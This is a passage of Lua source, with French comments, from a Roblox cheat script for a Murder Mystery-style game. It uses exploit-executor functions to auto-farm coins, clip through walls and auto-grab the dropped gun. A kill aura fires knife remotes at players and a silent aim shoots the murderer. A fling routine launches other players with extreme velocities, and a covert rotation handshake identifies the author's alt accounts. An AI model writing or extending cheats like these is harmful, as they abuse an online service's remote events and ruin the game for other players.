                    want = EMO_OUT .. " " .. base
                end
            end
            if lbl.Text ~= want then lbl.Text = want end
        end
    end
end
end

-- Menaces à éviter : murder si on n'est pas murder, sheriff si on est murder (amis ignorés)
local function getThreats()
    local out = {}
    local want = (myRoleCached == "murder") and "sheriff" or "murder"
    for name, role in pairs(roles) do
        if role == want then
            local p = players:FindFirstChild(name)
            if p and isAlive(p) and not (CFG.IgnoreFriends and isFriend(p)) then
                local ch = p.Character
                if not CFG.KillerHunt or ch:FindFirstChildOfClass("Tool") then
                    out[#out + 1] = ch.HumanoidRootPart.Position
                end
            end
        end
    end
    return out
end

-- ===== Bonbons =====
local function alive(c) return c.Parent and c:FindFirstChild("TouchInterest") end

local lastModelSearch = 0
local function scan()
    local list = {}
    if not targetModel or not targetModel:IsDescendantOf(workspace) then
        targetModel = nil
        local now = os.clock()
        if now - lastModelSearch > 1 then
            lastModelSearch = now
            targetModel = workspace:FindFirstChild("CoinContainer", true)
        end
    end
    if not targetModel then return list end
    for _, c in ipairs(targetModel:GetChildren()) do
        if c:IsA("BasePart") and c:FindFirstChild("TouchInterest") then list[#list + 1] = c end
    end
    return list
end

local function segDist(a, b, p)
    local ab = b - a
    local l2 = ab:Dot(ab)
    if l2 < 1e-6 then return (p - a).Magnitude end
    local t = math.clamp((p - a):Dot(ab) / l2, 0, 1)
    return (p - (a + ab * t)).Magnitude
end

local function neighbors(list, c)
    local n = 0
    for _, o in ipairs(list) do
        if o ~= c and (o.Position - c.Position).Magnitude <= CFG.ClusterR then n += 1 end
    end
    return n
end

-- Positions des amis vivants en manche (pour ne pas farmer les mêmes bonbons)
local frT, frV = 0, {}
local function friendPositions()
    local now = os.clock()
    if now - frT < 0.2 then return frV end
    frT, frV = now, {}
    for _, p in ipairs(players:GetPlayers()) do
        if p ~= localPlayer and isFriend(p) and isAlive(p) and inRound(p) then
            frV[#frV + 1] = p.Character.HumanoidRootPart.Position
        end
    end
    return frV
end

-- Score = -distance + devant*AheadW + voisins*ClusterW - pénalité près des amis ; exclut les trajets près des menaces
local function pickBest(list, pos, fwd, kills, exclude)
    local best, bs
    local now = os.clock()
    local fps = CFG.AvoidFriendRadius > 0 and friendPositions() or {}

    for _, c in ipairs(list) do
        if c ~= exclude and not (banned[c] and banned[c] > now) then
            local ok = true
            for _, k in ipairs(kills) do
                if segDist(pos, c.Position, k) < CFG.KillerR then ok = false break end
            end
            if ok then
                local to = c.Position - pos
                local dist = to.Magnitude
                local s = -dist

                for _, fp in ipairs(fps) do
                    if (c.Position - fp).Magnitude <= CFG.AvoidFriendRadius then
                        s -= CFG.AvoidFriendWeight
                        break
                    end
                end

                if fwd and dist > 0.01 then s += fwd:Dot(to / dist) * CFG.AheadW end
                if CFG.Cluster then s += neighbors(list, c) * CFG.ClusterW end
                if not bs or s > bs then best, bs = c, s end
            end
        end
    end
    return best
end

-- ===== Debug visuel =====
local DBG, lineA, lineB, zone
local marks, dbgDirty = {}, false

local function mkLine(col)
    local p = Instance.new("Part")
    p.Anchored, p.CanCollide, p.CanQuery, p.CanTouch = true, false, false, false
    p.Material, p.Color, p.Transparency = Enum.Material.Neon, col, 1
    p.Size = Vector3.new(0.25, 0.25, 0.25)
    p.Parent = DBG
    return p
end

local function setLine(p, a, b)
    if not a or not b then p.Transparency = 1 return end
    local d = math.max((b - a).Magnitude, 0.1)
    p.Size = Vector3.new(0.25, 0.25, d)
    p.CFrame = CFrame.lookAt(a, b) * CFrame.new(0, 0, -d / 2)
    p.Transparency = 0.2
end

local function dbgInit()
    if DBG and DBG.Parent then return end
    DBG = Instance.new("Folder")
    DBG.Name = "CandyDebug"
    DBG.Parent = workspace
    lineA = mkLine(Color3.fromRGB(0, 220, 255))
    lineB = mkLine(Color3.fromRGB(255, 230, 0))
    zone = mkLine(Color3.fromRGB(255, 0, 0))
    zone.Shape = Enum.PartType.Ball
end

local function mkMark(c)
    local g = Instance.new("BillboardGui")
    g.Size, g.AlwaysOnTop, g.Adornee, g.Parent = UDim2.fromOffset(28, 28), true, c, DBG
    local f = Instance.new("Frame")
    f.Name, f.Size, f.BackgroundTransparency, f.BorderSizePixel = "F", UDim2.fromScale(1, 1), 0.2, 0
    f.Parent = g
    Instance.new("UICorner", f).CornerRadius = UDim.new(1, 0)
    local t = Instance.new("TextLabel")
    t.Name, t.Size, t.BackgroundTransparency = "T", UDim2.fromScale(1, 1), 1
    t.TextColor3, t.Font, t.TextSize = Color3.new(0, 0, 0), Enum.Font.GothamBold, 14
    t.Parent = f
    return g
end

local function clearDebug()
    if not dbgDirty then return end
    dbgDirty = false
    for c, m in pairs(marks) do m:Destroy() marks[c] = nil end
    if lineA then lineA.Transparency, lineB.Transparency, zone.Transparency = 1, 1, 1 end
end

local function updateDebug(list, pos, target, kills)
    dbgInit()
    dbgDirty = true
    local seen = {}
    for _, c in ipairs(list) do
        seen[c] = true
        local n = neighbors(list, c)
        local m = marks[c]
        if n == 0 and c ~= target then
            if m then m:Destroy() marks[c] = nil end
        else
            if not m then m = mkMark(c) marks[c] = m end
            m.F.BackgroundColor3 = c == target and Color3.fromRGB(0, 200, 255)
                or (n >= 3 and Color3.fromRGB(0, 230, 80) or Color3.fromRGB(255, 170, 0))
            m.F.T.Text = tostring(n)
        end
    end
    for c, m in pairs(marks) do
        if not seen[c] then m:Destroy() marks[c] = nil end
    end
    local nxt = target and pickBest(list, target.Position, nil, kills, target)
    setLine(lineA, pos, target and target.Position)
    setLine(lineB, target and target.Position, nxt and nxt.Position)
    if #kills > 0 then
        zone.Position = kills[1]
        zone.Size = Vector3.one * CFG.KillerR * 2
        zone.Transparency = 0.85
    else
        zone.Transparency = 1
    end
end

-- ===== NoClip : Stepped (parties du perso) ou Touched (murs touchés) =====
local ncParts, ncChar, ncT = {}, nil, 0
RunService.Stepped:Connect(function()
    local on = zoneActive or (nc and CFG.NoClip and not CFG.NoClipTouched)
    if not on then return end
    local ch = localPlayer.Character
    if not ch then return end
    local t = os.clock()
    if ch ~= ncChar or t - ncT > 2 then
        ncChar, ncT, ncParts = ch, t, {}
        for _, p in ipairs(ch:GetDescendants()) do
            if p:IsA("BasePart") then ncParts[#ncParts + 1] = p end
        end
    end
    for _, p in ipairs(ncParts) do p.CanCollide = false end
end)

local ncOrig, tConns, tChar = {}, {}, nil
local touchNames = {"HumanoidRootPart", "Torso", "UpperTorso", "LowerTorso",
    "LeftArm", "LeftUpperArm", "LeftLowerArm", "LeftHand",
    "RightArm", "RightUpperArm", "RightLowerArm", "RightHand"}

local function onTouch(hit)
    if not (nc and CFG.NoClip and CFG.NoClipTouched) then return end
    if not hit.CanCollide or hit:IsA("Terrain") or hit.Name == "Baseplate" then return end
    local ch = localPlayer.Character
    local r = ch and ch:FindFirstChild("HumanoidRootPart")
    if not r or hit:IsDescendantOf(ch) then return end
    local m = hit:FindFirstAncestorOfClass("Model")
    if m and m:FindFirstChildOfClass("Humanoid") then return end
    if hit.Position.Y < r.Position.Y - r.Size.Y then return end -- ne pas traverser le sol
    ncOrig[hit] = true
    hit.CanCollide = false
end

local function hookTouch(ch)
    tChar = ch
    for _, cn in ipairs(tConns) do cn:Disconnect() end
    tConns = {}
    for _, n in ipairs(touchNames) do
        local p = ch:FindFirstChild(n)
        if p and p:IsA("BasePart") then tConns[#tConns + 1] = p.Touched:Connect(onTouch) end
    end
end

local function ncRestore()
    for p in pairs(ncOrig) do
        if p.Parent then p.CanCollide = true end
        ncOrig[p] = nil
    end
end

local function setNoClipMode(m)
    CFG.NoClipMode = m
    CFG.NoClip = (m ~= "Off")
    CFG.NoClipTouched = (m == "Touched")
    if m ~= "Touched" then ncRestore() end
end

-- ===== Transparence des objets autour =====
local ghosted = {}
local gp = OverlapParams.new()
gp.FilterType = Enum.RaycastFilterType.Exclude

local function ghostClear()
    for p, o in pairs(ghosted) do
        if p.Parent then p.Transparency = o end
        ghosted[p] = nil
    end
end

local function ghostUpdate(center)
    local ex = {}
    for _, pl in ipairs(players:GetPlayers()) do
        if pl.Character then ex[#ex + 1] = pl.Character end
    end
    if targetModel then ex[#ex + 1] = targetModel end
    if DBG then ex[#ex + 1] = DBG end
    gp.FilterDescendantsInstances = ex
    local seen = {}
    for _, p in ipairs(workspace:GetPartBoundsInRadius(center, CFG.GhostR, gp)) do
        if ghosted[p] or p.Transparency < 0.6 then
            seen[p] = true
            if not ghosted[p] then
                ghosted[p] = p.Transparency
                p.Transparency = 0.75
            end
        end
    end
    for p, o in pairs(ghosted) do
        if not seen[p] then
            if p.Parent then p.Transparency = o end
            ghosted[p] = nil
        end
    end
end

-- ===== Rotation du personnage (Spin / Roue 360 / Couché, combinables) =====
local rotS = {spin = 0, tx = 0, ty = 0, tz = 0, flickT = 0}

local function hasMode(m)
    return string.find(CFG.RotModes, m, 1, true) ~= nil
end

local function orientation(dir, dt, hrp)
    local spinOn, couche, roue = hasMode("Spin"), hasMode("Couché"), hasMode("Roue 360")
    local rot
    if roue then
        -- roue : rotation sur les 3 axes à des vitesses différentes
        local s = math.rad(CFG.SpinSpeed) * dt
        rotS.tx = (rotS.tx + s) % (2 * math.pi)
        rotS.ty = (rotS.ty + s * 0.73) % (2 * math.pi)
        rotS.tz = (rotS.tz + s * 1.31) % (2 * math.pi)
        rot = CFrame.Angles(rotS.tx, rotS.ty, rotS.tz)
    elseif couche then
        -- couché à l'horizontale, tête vers la direction du déplacement, visage tourné vers le HAUT
        local up = Vector3.yAxis - dir * Vector3.yAxis:Dot(dir)
        if up.Magnitude < 1e-3 then up = Vector3.zAxis end
        local back = -up.Unit            -- l'avant du perso (-Z) pointe vers le ciel
        rot = CFrame.fromMatrix(Vector3.zero, dir:Cross(back), dir, back)
        if spinOn then
            -- Spin + Couché : rotation autour de l'axe tête-pieds (balle de fusil)
            rotS.spin = (rotS.spin + CFG.SpinSpeed * dt) % 360
            rot = rot * CFrame.Angles(0, math.rad(rotS.spin), 0)
        end
    elseif spinOn then
        rotS.spin = (rotS.spin + CFG.SpinSpeed * dt) % 360
        rot = CFrame.Angles(0, math.rad(rotS.spin), 0)
    else
        local h = Vector3.new(dir.X, 0, dir.Z)
        rot = h.Magnitude > 1e-3 and CFrame.lookAt(Vector3.zero, h) or hrp.CFrame.Rotation
    end

    -- tour brutal périodique
    local now = os.clock()
    if CFG.Flick360Interval > 0 and now - rotS.flickT > CFG.Flick360Interval then
        rotS.flickT = now
        rot = rot * CFrame.Angles(0, math.rad(180 + math.random(-45, 45)), 0)
    end
    return rot
end

-- ===== Auto Play (écran Join) =====
do
local function clickButton(btn)
    if not getconnections then return end
    for _, ev in ipairs({btn.MouseButton1Click, btn.MouseButton1Down, btn.Activated}) do
        for _, cn in ipairs(getconnections(ev)) do pcall(function() cn:Fire() end) end
    end
end

function CTX.startAutoPlay()
    task.spawn(function()
        local clickedAt = 0
        while true do
            task.wait(0.5)
            if CFG.AutoPlay then
                pcall(function()
                    local pg = localPlayer:FindFirstChild("PlayerGui")
                    local join = pg and pg:FindFirstChild("Join")
                    local fr = join and join:FindFirstChild("Friends")
                    local btn = fr and fr:FindFirstChild("Play")
                    if btn and btn.Visible and fr.Visible and join.Enabled and os.clock() - clickedAt > 5 then
                        task.wait(1)
                        clickButton(btn)
                        clickedAt = os.clock()
                        notify("Auto Play", "Clic sur Play", 3)
                    end
                end)
            end
        end
    end)
end
end

-- ===== Auto pickup du Gun (GunDrop) =====
do
local gunBusy = setmetatable({}, {__mode = "k"})

local function touchPartOf(drop)
    local ti = drop:FindFirstChildOfClass("TouchInterest") or drop:FindFirstChild("TouchInterest", true)
    if ti and ti.Parent and ti.Parent:IsA("BasePart") then return ti.Parent end
    if drop:IsA("BasePart") then return drop end
    return drop:FindFirstChildWhichIsA("BasePart", true)
end

local function handleGunDrop(drop)
    if gunBusy[drop] then return end
    gunBusy[drop] = true
    if not flagGunDrop then
        flagGunDrop = true
        notify("GunDrop", "Le Gun est au sol" .. ((CFG.AutoGun and myRoleCached ~= "murder") and " : ramassage auto" or ""), 5)
    end
    if not CFG.AutoGun or myRoleCached == "murder" or not firetouchinterest then return end
    local t0 = os.clock()
    while drop.Parent and CFG.AutoGun and os.clock() - t0 < 15 do
        local hrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        local part = touchPartOf(drop)
        if hrp and part then
            pcall(function()
                firetouchinterest(hrp, part, 0)
                task.wait(0.02)
                firetouchinterest(hrp, part, 1)
            end)
        end
        task.wait(0.3)
    end
    task.wait(0.3)
    if not drop.Parent then
        if hasTool(localPlayer, "Gun") then
            stat("guns")
            notify("Gun récupéré", "Tu es maintenant Sheriff", 7)
        else
            local who
            for _, p in ipairs(players:GetPlayers()) do
                if p ~= localPlayer and hasTool(p, "Gun") then who = p.Name break end
            end
            notify("Gun pris", (who or "Quelqu'un") .. " a ramassé le Gun", 7)
        end
    else
        notify("GunDrop", "Ramassage échoué", 3)
    end
end

function CTX.startGunWatch()
    workspace.DescendantAdded:Connect(function(d)
        if d.Name == "GunDrop" then task.spawn(handleGunDrop, d) end
    end)
    for _, d in ipairs(workspace:GetDescendants()) do
        if d.Name == "GunDrop" then task.spawn(handleGunDrop, d) end
    end
end
end

-- ===== Kill Aura Murder / Sheriff / modes de fin de manche =====
function CTX.trackKills()
    local now = os.clock()
    for p, t in pairs(CTX.combat.attacked) do
        if not p.Parent or not isAlive(p) then
            if now - t < 6 and not CTX.combat.killedSet[p.Name] then
                CTX.combat.killedSet[p.Name] = true
                stat("kills")
                notify("Kill", p.Name, 3)
            end
            CTX.combat.attacked[p] = nil
        elseif now - t > 6 then
            CTX.combat.attacked[p] = nil
        end
    end
end

function CTX.knifeEvents()
    local ch = localPlayer.Character
    if not ch then return nil end
    local bp = localPlayer:FindFirstChild("Backpack")
    local knife = ch:FindFirstChild("Knife") or (bp and bp:FindFirstChild("Knife"))
    local ev = knife and knife:FindFirstChild("Events")
    return knife, ev and ev:FindFirstChild("HandleTouched"), ev
end

function CTX.finalFriendsMode()
    local now = os.clock()
    if now - CTX.combat.finalT < 0.15 then return CTX.combat.finalV end
    CTX.combat.finalT = now
    local prev = CTX.combat.finalV
    CTX.combat.finalV = false
    if CFG.FinalKill and myRoleCached == "murder"
        and (hiding or (bagFullCached() and CTX.isHiddenSpot(localPlayer))) then
        local n, okAll = 0, true
        for _, p in ipairs(players:GetPlayers()) do
            if p ~= localPlayer and isAlive(p) and inRound(p) then
                if not isFriend(p) or not CTX.isHiddenSpot(p) then
                    okAll = false
                    break
                end
                n += 1
            end
        end
        CTX.combat.finalV = okAll and n > 0
    end
    if CTX.combat.finalV and not prev then CTX.combat.finalStartT = now end
    return CTX.combat.finalV
end

function CTX.finalNeedsDelay()
    local my = CTX.levelOf(localPlayer)
    if not my or my < CFG.MaxLevel then return false end
    for _, p in ipairs(players:GetPlayers()) do
        if p ~= localPlayer and isFriend(p) and isAlive(p) and inRound(p) then
            local level = CTX.levelOf(p)
            if level and level < CFG.MaxLevel then return true end
        end
    end
    return false
end

function CTX.finalGo()
    if not CTX.finalFriendsMode() then return false end
    if CFG.FinalDelay > 0 and CTX.finalNeedsDelay()
        and os.clock() - CTX.combat.finalStartT < CFG.FinalDelay then
        return false
    end
    return true
end

-- En mode Assassin, Target3 est traité dès son apparition.
function CTX.assassinStep()
    if not (CFG.KA and CFG.KAAssassin) then return end
    local name = assassinTargetName()
    if not name then return end
    local p = players:FindFirstChild(name)
    if not p or p == localPlayer then return end
    local knife, touch = CTX.knifeEvents()
    if not touch then return end
    local pc = p.Character
    local tr = pc and pc:FindFirstChild("HumanoidRootPart")
    local th = pc and pc:FindFirstChildOfClass("Humanoid")
    if not tr or not th or th.Health <= 0 then return end
    local friend = isFriend(p)
    local go = CTX.finalGo()
    if friend and CFG.IgnoreFriends and not go then return end
    if not friend and CFG.PreventEarlyKill and not (hiding or bagFullCached()) and CTX.wouldEndRound(p) then return end
    if CFG.KAEquip and knife.Parent ~= localPlayer.Character then
        local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then pcall(function() hum:EquipTool(knife) end) end
    end
    for _ = 1, math.max(1, CFG.KABurst) do
        pcall(touch.FireServer, touch, tr)
    end
    CTX.combat.attacked[p] = os.clock()
    CTX.trackKills()
end

function CTX.runKillAura()
    if not CFG.KA then return end
    if CFG.KAAssassin and assassinTargetName() then return end
    if myRoleCached ~= "murder" then return end
    local ch = localPlayer.Character
    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
    local hum = ch and ch:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum or hum.Health <= 0 then return end
    local knife, touch, events = CTX.knifeEvents()
    if not touch then return end
    if CFG.KAEquip and knife.Parent ~= ch then
        pcall(function() hum:EquipTool(knife) end)
        task.wait(0.05)
    end

    local bagFull = hiding or bagFullCached()
    local final = CTX.finalFriendsMode()
    local go = final and CTX.finalGo()
    local allowSheriff = CFG.KASheriff == "Toujours"
        or (CFG.KASheriff == "Sac plein" and bagFull)
    if go and not CTX.combat.flagFinal then
        CTX.combat.flagFinal = true
        notify("Fin de manche", "Il ne reste que des amis : kill final", 7)
    end

    local cands = {}
    if not final and obtenirModeActuel() == "Assassin" then
        local name = assassinTargetName()
        local p = name and players:FindFirstChild(name)
        if p then cands[1] = p end
    else
        for _, p in ipairs(players:GetPlayers()) do
            if p ~= localPlayer then cands[#cands + 1] = p end
        end
    end

    local now = os.clock()
    for _, p in ipairs(cands) do
        local pc = p.Character
        local tr = pc and pc:FindFirstChild("HumanoidRootPart")
        local th = pc and pc:FindFirstChildOfClass("Humanoid")
        if tr and th and th.Health > 0 and inRound(p) then
            local friend = isFriend(p)
            local ok
            if final then
                ok = friend and go
            else
                ok = not (CFG.IgnoreFriends and friend)
                if ok and roles[p.Name] == "sheriff" and not allowSheriff then ok = false end
                if ok and CFG.PreventEarlyKill and not bagFull and CTX.wouldEndRound(p) then ok = false end
                if ok and CFG.KARange == "Rayon"
                    and (tr.Position - hrp.Position).Magnitude > CFG.KARadius then
                    ok = false
                end
            end
            if ok then
                if CFG.KAStab and events then
                    local stab = events:FindFirstChild("KnifeStabbed")
                    if stab then pcall(stab.FireServer, stab) end
                end
                pcall(touch.FireServer, touch, tr)
                CTX.combat.attacked[p] = now
            end
        end
    end
    CTX.trackKills()
end

function CTX.findShootRemote(gun)
    if CTX.combat.shotCache[gun] then return CTX.combat.shotCache[gun] end
    local found
    local prefer = {Shoot = true, Gun = true, Fire = true, ShootGun = true}
    for _, d in ipairs(gun:GetDescendants()) do
        if (d:IsA("RemoteEvent") or d:IsA("RemoteFunction")) and prefer[d.Name] then
            found = d
            break
        end
    end
    if not found then
        for _, d in ipairs(gun:GetDescendants()) do
            if d:IsA("RemoteEvent") then found = d break end
        end
    end
    if not found and getnilinstances then
        for _, o in ipairs(getnilinstances()) do
            if o:IsA("RemoteEvent") and o.Name == "Gun" then found = o break end
        end
    end
    if found then
        CTX.combat.shotCache[gun] = found
        pushLog("SHERIFF", "Remote de tir : " .. found.Name .. " (" .. found.ClassName .. ")")
    end
    return found
end

function CTX.runSheriff()
    if not CFG.SA or myRoleCached ~= "sheriff" then return end
    local ch = localPlayer.Character
    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
    local hum = ch and ch:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum or hum.Health <= 0 then return end
    if CFG.SAWhen == "Sac plein" and not (hiding or bagFullCached()) then return end
    local bp = localPlayer:FindFirstChild("Backpack")
    local gun = ch:FindFirstChild("Gun") or (bp and bp:FindFirstChild("Gun"))
    if not gun or not gun:IsA("Tool") then return end

    local best, bd
    for _, p in ipairs(players:GetPlayers()) do
        if p ~= localPlayer and isAlive(p) and not (CFG.IgnoreFriends and isFriend(p))
            and (roles[p.Name] == "murder" or hasTool(p, "Knife")) then
            local targetRoot = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                local d = (targetRoot.Position - hrp.Position).Magnitude
                if not bd or d < bd then best, bd = p, d end
            end
        end
    end
    if not best then return end

    local pc = best.Character
    if not pc then return end
    local part
    if CFG.SAPart == "Tête" then part = pc:FindFirstChild("Head")
    elseif CFG.SAPart == "HumanoidRootPart" then part = pc:FindFirstChild("HumanoidRootPart")
    else part = pc:FindFirstChild("UpperTorso") or pc:FindFirstChild("Torso") end
    part = part or pc:FindFirstChild("HumanoidRootPart")
    if not part then return end

    if gun.Parent ~= ch then
        pcall(function() hum:EquipTool(gun) end)
        task.wait(0.05)
    end
    local remote = CTX.findShootRemote(gun)
    if not remote then return end

    local origin, target = hrp.CFrame, CFrame.new(part.Position)
    local a, b = target, origin
    if CFG.SAOrder == "Origine, Cible" then a, b = origin, target end
    if remote:IsA("RemoteFunction") then
        task.spawn(pcall, remote.InvokeServer, remote, a, b)
    else
        pcall(remote.FireServer, remote, a, b)
    end
end

-- ===== Fling (fin de manche) =====
function CTX.flingTarget(tp, tmax, backCF)
    local ch = localPlayer.Character
    local hum = ch and ch:FindFirstChildOfClass("Humanoid")
    local root = hum and hum.RootPart
    local tch = tp.Character
    local thum = tch and tch:FindFirstChildOfClass("Humanoid")
    local troot = thum and thum.RootPart
    if not (root and troot and thum) or thum.Health <= 0 or thum.Sit then return end

    local function fpos(off, rot)
        root.CFrame = CFrame.new(troot.Position) * off * rot
        root.AssemblyLinearVelocity = Vector3.new(9e7, 9e8, 9e7)
        root.AssemblyAngularVelocity = Vector3.new(9e8, 9e8, 9e8)
        lastTick = os.clock()
        task.wait()
    end

    local t0, ang = os.clock(), 0
    repeat
        if not (root.Parent and troot.Parent) or thum.Health <= 0 or not CFG.FlingEnd then break end
        local spd = troot.AssemblyLinearVelocity.Magnitude
        if spd < 50 then
            ang += 100
            local r = CFrame.Angles(math.rad(ang), 0, 0)
            local mv = thum.MoveDirection
            fpos(CFrame.new(0, 1.5, 0) + mv * spd / 1.25, r)
            fpos(CFrame.new(0, -1.5, 0) + mv * spd / 1.25, r)
            fpos(CFrame.new(0, 1.5, 0) + mv * spd / 1.25, r)
            fpos(CFrame.new(0, -1.5, 0) + mv * spd / 1.25, r)
            fpos(CFrame.new(0, 1.5, 0) + mv, r)
            fpos(CFrame.new(0, -1.5, 0) + mv, r)
        else
            local ws = thum.WalkSpeed
            fpos(CFrame.new(0, 1.5, ws), CFrame.Angles(math.rad(90), 0, 0))
            fpos(CFrame.new(0, -1.5, -ws), CFrame.Angles(0, 0, 0))
            fpos(CFrame.new(0, 1.5, ws), CFrame.Angles(math.rad(90), 0, 0))
            fpos(CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
            fpos(CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
            fpos(CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
            fpos(CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
        end
    until os.clock() - t0 > tmax

    local t1 = os.clock()
    repeat
        root.AssemblyLinearVelocity, root.AssemblyAngularVelocity = Vector3.zero, Vector3.zero
        root.CFrame = backCF
        lastTick = os.clock()
        task.wait()
    until (root.Position - backCF.Position).Magnitude < 25 or os.clock() - t1 > 2
    root.AssemblyLinearVelocity = Vector3.zero
end

function CTX.flingCandidates()
    local out = {}
    for _, p in ipairs(players:GetPlayers()) do
        if p ~= localPlayer and isAlive(p) and inRound(p) and not isFriend(p) then
            local role = roles[p.Name]
            if CFG.FlingTargets == "Tous les joueurs" or role == "murder" or role == "sheriff" then
                out[#out + 1] = p
            end
        end
    end
    return out
end

-- ===== Anti-Fling Intelligent Débrayable =====
local flingLoop = nil
local function togglePhysicalAntiFling(enable)
    if not enable then
        if flingLoop then flingLoop:Disconnect() flingLoop = nil end
        return
    end
    if flingLoop then return end

    flingLoop = RunService.Heartbeat:Connect(function()
        if not CFG.AntiFling or not localPlayer.Character then return end
        for _, p in ipairs(players:GetPlayers()) do
            if p ~= localPlayer and p.Character then
                local hrp = p.Character:FindFirstChild("HumanoidRootPart")
                if hrp and hrp:IsA("BasePart") and not hrp.Anchored then
                    pcall(function()
                        hrp.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                        hrp.CanCollide = false
                    end)
                end
            end
        end
    end)
end

-- ===== Manche : phases, zone secrète, poignée de main entre amis =====
local phase = "lobby"        -- lobby / pre / round
local preStartT, preArrival, zonePos = 0, nil, nil
local SECRET = 7919          -- code partagé entre tes comptes : change-le (même valeur partout)
local hs = {}                -- handshake : nom -> {hist, time, lastOk, ok}
local lastBigTPT, lastInLobbyT, overSince = 0, 0, nil
local cntT, cntV = 0, 0

local function codeAt(t)
    local n = math.floor(t)
    return (n * 7 + (n // 3) * 5 + SECRET) % 16
end

local function yawOf(cf)
    local l = cf.LookVector
    return math.deg(math.atan2(-l.X, -l.Z)) % 360
end

local function myHRP()
    local ch = localPlayer.Character
    return ch and ch:FindFirstChild("HumanoidRootPart"), ch and ch:FindFirstChildOfClass("Humanoid")
end

local function coinCount()
    local now = os.clock()
    if now - cntT > 0.1 then cntT, cntV = now, #scan() end
    return cntV
end

-- Dans la zone, on se fige et on "parle" : l'angle (yaw) suit un code qui change chaque seconde
RunService.Heartbeat:Connect(function()
    if not zoneActive or not zonePos then return end
    local hrp, hum = myHRP()
    if not hrp or not hum or hum.Health <= 0 then return end
    CTX.anchor(hrp, false)   -- ancré = non répliqué : les amis ne verraient pas l'angle
    hum.AutoRotate = false
    local code = codeAt(workspace:GetServerTimeNow())
    hrp.CFrame = CFrame.new(zonePos) * CFrame.Angles(0, math.rad(code * 22.5), 0)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end)

-- On écoute les autres : leur yaw doit suivre le même code (avec une marge de latence)
task.spawn(function()
    while true do
        task.wait(0.1)
        if zoneActive and phase == "pre" and CFG.AutoFriends and CFG.PreHide == "Zone secrète" then
            pcall(function()
                local t = workspace:GetServerTimeNow()
                local want = {codeAt(t), codeAt(t - 0.25), codeAt(t - 0.5)}
                for _, p in ipairs(players:GetPlayers()) do
                    if p ~= localPlayer and inZone(p) then
                        local hrp = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            local y, m = yawOf(hrp.CFrame), false
                            for _, c in ipairs(want) do
                                if math.abs((y - c * 22.5 + 180) % 360 - 180) <= 10 then m = true break end
                            end
                            local h = hs[p.Name]
                            if not h then
                                h = {hist = {}, time = 0, lastOk = 0, ok = false}
                                hs[p.Name] = h
                            end
                            h.hist[#h.hist + 1] = m and 1 or 0
                            if #h.hist > 12 then table.remove(h.hist, 1) end
                            local sum = 0
                            for _, v in ipairs(h.hist) do sum += v end
                            h.ok = #h.hist >= 8 and sum / #h.hist >= 0.6
                            if h.ok then
                                h.time += 0.1
                                h.lastOk = os.clock()
                            end
                        end
                    end
                end
            end)
        end
    end
end)

local function leaveZone()
    if not zoneActive then return end
    zoneActive = false
    local _, hum = myHRP()
    if hum then hum.AutoRotate = true end
end

local function finalizeFriends()
    local now = os.clock()
    for name, h in pairs(hs) do
        local p = players:FindFirstChild(name)
        if p and h.time >= CFG.HandshakeMin and now - h.lastOk <= 3 and autoFriends[name:lower()] == nil then
            autoFriends[name:lower()] = name
            notify("Ami détecté", name .. " (handshake)", 10)
        end
    end
end

local function enterPre(reason)
    local hrp = myHRP()
    if not hrp then return end
    phase = "pre"
    pushLog("PHASE", "lobby -> pre (" .. reason .. ")")
    autoFriends, hs = {}, {}
    preStartT, preArrival = os.clock(), hrp.CFrame
    notify("Manche", "Début de manche (" .. reason .. ")", 4)
    if CFG.PreZone and CFG.PreHide ~= "Aucun" then
        if CFG.PreHide == "Zone secrète" then
            zonePos = zoneCenter() + zoneSlotOffset()
        else
            zonePos = preArrival.Position - Vector3.new(0, CFG.SafeDepth, 0)
        end
        zoneActive = true
        CTX.anchor(hrp, false)
        hrp.CFrame = CFrame.new(zonePos)
        lastKnownPosition = zonePos
    end
end

local function enterRound(timedOut)
    local hrp = myHRP()
    finalizeFriends()
    leaveZone()
    if not hrp then return end
    local list = scan()
    local best = pickBest(list, hrp.Position, nil, CFG.Killer and getThreats() or {}, nil)
    if best then
        CTX.anchor(hrp, false)
        hrp.CFrame = CFrame.new(best.Position + Vector3.new(0, CFG.YOffset, 0))
        hrp.AssemblyLinearVelocity = Vector3.zero
        pcall(function()
            firetouchinterest(hrp, best, 0)
            firetouchinterest(hrp, best, 1)
        end)
        lastAct, lastActT = "tp", os.clock()
    elseif timedOut and preArrival then
        hrp.CFrame = preArrival
    end
end

local function phaseStep()
    local now = os.clock()
    local hrp, hum = myHRP()
    if not hrp or not hum or hum.Health <= 0 then
        if phase ~= "lobby" then
            phase = "lobby"
            pushLog("PHASE", "-> lobby (mort / absent)")
            leaveZone()
        end
        return
    end

    local pos = hrp.Position
    if lastKnownPosition and (pos - lastKnownPosition).Magnitude > CFG.PhaseTPDist then lastBigTPT = now end
    lastKnownPosition = pos

    local lobbyKnown = getLobbyBox() ~= nil
    local inLobby = inLobbyPos(pos)
    if lobbyKnown and inLobby then lastInLobbyT = now end

    local wstate, wkind = waitingState()
    local a = localPlayer:GetAttribute("Alive")
    local aliveOk = a ~= false

    if phase == "lobby" then
        -- TP vers la map confirmé par l'image "Loading map..." (qui reste en place mais devient invisible)
        local gate = (not CFG.PhaseUseWaiting) or wstate == "unknown" or (wkind == "loading" and wstate ~= "waiting")
        local evidence = (now - lastBigTPT < 3)
            or (lobbyKnown and not inLobby and now - lastInLobbyT < 2)
            or (lobbyKnown and not inLobby and now - charAddedT < 3)
        if aliveOk and gate and evidence and not zoneActive and not CTX.voting then
            enterPre("TP serveur")
        elseif aliveOk and not inLobby and assassinTargetName() then
